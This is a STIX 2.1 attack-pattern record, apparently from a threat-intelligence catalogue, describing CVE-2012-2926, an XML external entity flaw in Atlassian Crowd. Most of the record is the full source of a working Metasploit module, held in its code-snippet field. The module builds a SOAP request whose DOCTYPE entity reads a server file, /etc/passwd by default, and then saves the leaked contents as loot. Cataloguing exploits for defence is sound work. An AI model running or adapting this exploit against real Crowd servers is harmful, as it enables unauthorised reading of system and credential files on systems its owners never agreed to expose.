{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--843853c3-fb7c-4699-8d3c-abbb61e85bcb",
    "created": "2024-08-14T16:29:07.604857Z",
    "modified": "2024-08-14T16:29:07.60486Z",
    "name": "Atlassian Crowd XML Entity Expansion Remote File Access",
    "description": " This module simply attempts to read a remote file from the server using a vulnerability in the way Atlassian Crowd handles XML files. The vulnerability occurs while trying to expand external entities with the SYSTEM identifier. This module has been tested successfully on Linux and Windows installations of Crowd.  'References'   => [",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/auxiliary/scanner/http/atlassian_crowd_fileaccess.rb",
            "external_id": "atlassian_crowd_fileaccess.rb"
        },
        {
            "source_name": "reference",
            "url": "https://confluence.atlassian.com/crowd/crowd-security-advisory-2012-05-17-283641186.html"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Auxiliary\n  include Msf::Exploit::Remote::HttpClient\n  include Msf::Auxiliary::Report\n  include Msf::Auxiliary::Scanner\n\n  def initialize\n    super(\n      'Name'         => 'Atlassian Crowd XML Entity Expansion Remote File Access',\n      'Description'  =>  %q{\n          This module simply attempts to read a remote file from the server using a\n        vulnerability in the way Atlassian Crowd handles XML files. The vulnerability\n        occurs while trying to expand external entities with the SYSTEM identifier. This\n        module has been tested successfully on Linux and Windows installations of Crowd.\n      },\n      'References'   =>\n        [\n          [ 'CVE', '2012-2926' ],\n          [ 'OSVDB', '82274' ],\n          [ 'BID', '53595' ],\n          [ 'URL', 'https://neg9.org/' ], # General\n          [ 'URL', 'https://confluence.atlassian.com/crowd/crowd-security-advisory-2012-05-17-283641186.html']\n        ],\n      'Author'       =>\n        [\n          'Will Caput', # Vulnerability discovery and Metasploit module\n          'Trevor Hartman', # Vulnerability discovery\n          'Thaddeus Bogner', # Metasploit module\n          'juan vazquez' # Metasploit module help\n        ],\n      'License'      => MSF_LICENSE\n    )\n\n    register_options(\n    [\n      Opt::RPORT(8095),\n      OptString.new('TARGETURI', [true, 'Path to Crowd', '/crowd/services']),\n      OptString.new('RFILE', [true, 'Remote File', '/etc/passwd'])\n\n    ])\n\n    register_autofilter_ports([ 8095 ])\n  end\n\n  def run_host(ip)\n    uri = normalize_uri(target_uri.path)\n    res = send_request_cgi({\n      'uri'     => uri,\n      'method'  => 'GET'})\n\n    if not res\n      print_error(\"#{rhost}:#{rport} Unable to connect\")\n      return\n    end\n\n    accessfile(ip)\n  end\n\n  def accessfile(rhost)\n    uri = normalize_uri(target_uri.path)\n    print_status(\"#{rhost}:#{rport} Connecting to Crowd SOAP Interface\")\n\n    soapenv = 'http://schemas.xmlsoap.org/soap/envelope/'\n    xmlaut = 'http://authentication.integration.crowd.atlassian.com'\n    xmlsoap = 'http://soap.integration.crowd.atlassian.com'\n    entity = Rex::Text.rand_text_alpha(rand(4) + 4)\n\n    data = \"<!DOCTYPE foo [<!ENTITY #{entity} SYSTEM \\\"file://#{datastore['RFILE']}\\\"> ]>\" + \"\\r\\n\"\n    data << '<soapenv:Envelope xmlns:soapenv=\"' + soapenv + '\" xmlns:urn=\"urn:SecurityServer\" xmlns:aut=\"' + xmlaut + '\" xmlns:soap=\"' + xmlsoap + '\">' + \"\\r\\n\"\n    data << '<soapenv:Header/>' + \"\\r\\n\"\n    data << '<soapenv:Body>' + \"\\r\\n\"\n    data << '<urn:addAllPrincipals>' + \"\\r\\n\"\n    data << '<urn:in0>' + \"\\r\\n\"\n    data << '<!--Optional:-->' + \"\\r\\n\"\n    data << '<aut:name>?</aut:name>' + \"\\r\\n\"\n    data << '<!--Optional:-->' + \"\\r\\n\"\n    data << '<aut:token>?</aut:token>' + \"\\r\\n\"\n    data << '</urn:in0>' + \"\\r\\n\"\n    data << '<urn:in1>' + \"\\r\\n\"\n    data << '<!--Zero or more repetitions:-->' + \"\\r\\n\"\n    data << '<soap:SOAPPrincipalWithCredential>' + \"\\r\\n\"\n    data << '<!--Optional:-->' + \"\\r\\n\"\n    data << '<soap:passwordCredential>' + \"\\r\\n\"\n    data << '<!--Optional:-->' + \"\\r\\n\"\n    data << '<aut:credential>?</aut:credential>' + \"\\r\\n\"\n    data << '<!--Optional:-->' + \"\\r\\n\"\n    data << '<aut:encryptedCredential>'\n    data << \"?&#{entity};\"\n    data << '</aut:encryptedCredential>' + \"\\r\\n\"\n    data << '</soap:passwordCredential>' + \"\\r\\n\"\n    data << '<!--Optional:-->' + \"\\r\\n\"\n    data << '<soap:principal>' + \"\\r\\n\"\n    data << '<!--Optional:-->' + \"\\r\\n\"\n    data << '<soap:ID>?</soap:ID>' + \"\\r\\n\"\n    data << '<!--Optional:-->' + \"\\r\\n\"\n    data << '<soap:active>?</soap:active>' + \"\\r\\n\"\n    data << '<!--Optional:-->' + \"\\r\\n\"\n    data << '<soap:attributes>' + \"\\r\\n\"\n    data << '<!--Zero or more repetitions:-->' + \"\\r\\n\"\n    data << '<soap:SOAPAttribute>' + \"\\r\\n\"\n    data << '<!--Optional:-->' + \"\\r\\n\"\n    data << '<soap:name>?</soap:name>' + \"\\r\\n\"\n    data << '<!--Optional:-->' + \"\\r\\n\"\n    data << '<soap:values>' + \"\\r\\n\"\n    data << '<!--Zero or more repetitions:-->' + \"\\r\\n\"\n    data << '<urn:string>?</urn:string>' + \"\\r\\n\"\n    data << '</soap:values>' + \"\\r\\n\"\n    data << '</soap:SOAPAttribute>' + \"\\r\\n\"\n    data << '</soap:attributes>' + \"\\r\\n\"\n\n    res = send_request_cgi({\n        'uri'      => uri,\n        'method'   => 'POST',\n        'ctype'    => 'text/xml; charset=UTF-8',\n        'data'     => data,\n        'headers'  => {\n          'SOAPAction'    => '\"\"',\n        }}, 60)\n\n    if res and res.code == 500\n      case res.body\n      when /<faultstring\\>Invalid boolean value: \\?(.*)<\\/faultstring>/m\n        loot = $1\n        if not loot or loot.empty?\n          print_status(\"#{rhost}#{rport} Retrieved empty file from #{rhost}:#{rport}\")\n          return\n        end\n        f = ::File.basename(datastore['RFILE'])\n        path = store_loot('atlassian.crowd.file', 'application/octet-stream', rhost, loot, f, datastore['RFILE'])\n        print_good(\"#{rhost}:#{rport} Atlassian Crowd - #{datastore['RFILE']} saved in #{path}\")\n        return\n      end\n    end\n\n    print_error(\"#{rhost}#{rport} Failed to retrieve file from #{rhost}:#{rport}\")\n  end\nend\n\n",
    "x_mitre_contributors": [
        ""
    ]
}